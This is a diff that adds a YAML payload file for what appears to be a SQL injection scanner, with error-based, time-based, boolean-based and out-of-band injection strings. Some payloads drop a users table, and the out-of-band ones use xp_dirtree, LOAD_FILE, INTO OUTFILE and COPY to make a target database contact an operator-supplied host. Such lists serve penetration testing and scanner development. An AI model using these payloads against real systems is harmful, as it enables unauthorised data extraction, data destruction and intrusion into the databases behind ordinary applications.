@@ -1,0 +1,40 @@
+# SQL Injection Payloads
+# Edit this file to add or remove payloads without touching source code.
+# The {oob} placeholder is replaced with the --oob-host value at runtime.
+
+payloads:
+  error_based:
+    - "'"
+    - '"'
+    - "' OR '1'='1"
+    - "' OR 1=1--"
+    - '" OR 1=1--'
+    - "1; DROP TABLE users--"
+    - "' UNION SELECT NULL--"
+    - "' UNION SELECT 1,2,3--"
+    - "' AND 1=CONVERT(int, (SELECT @@version))--"
+    - "1 AND 1=1 UNION SELECT 1,2,3--"
+
+  time_based:
+    - "' AND SLEEP(5)-- -"
+    - '" AND SLEEP(5)-- -'
+    - "'; WAITFOR DELAY '0:0:5'--"
+    - "1; WAITFOR DELAY '0:0:5'--"
+    - "' AND BENCHMARK(5000000,MD5('test'))--"
+    - "'; SELECT pg_sleep(5)--"
+    - "1 AND SLEEP(5)--"
+
+  boolean_based:
+    - [" AND 1=1-- -", " AND 1=2-- -"]
+    - ["' AND '1'='1", "' AND '1'='2"]
+    - ["' AND 1=1--", "' AND 1=2--"]
+    - ["%' AND 1=1-- -", "%' AND 1=2-- -"]
+    - ["' AND 1=1 AND '%'='", "' AND 1=2 AND '%'='"]
+
+  oob:
+    - "'; exec xp_dirtree '//{oob}/test'--"
+    - "' UNION SELECT LOAD_FILE(CONCAT('\\\\', '{oob}', '\\test'))"
+    - "'; DECLARE @q VARCHAR(99); SET @q='\\{oob}\\test'; exec master.dbo.xp_dirtree @q;--"
+    - "' OR 1=1 INTO OUTFILE '\\\\{oob}\\test'--"
+    - "LOAD_FILE(CONCAT('\\\\\\\\', '{oob}', '\\\\test'))"
+    - "'; COPY (SELECT 'test') TO '//{oob}/test'--"
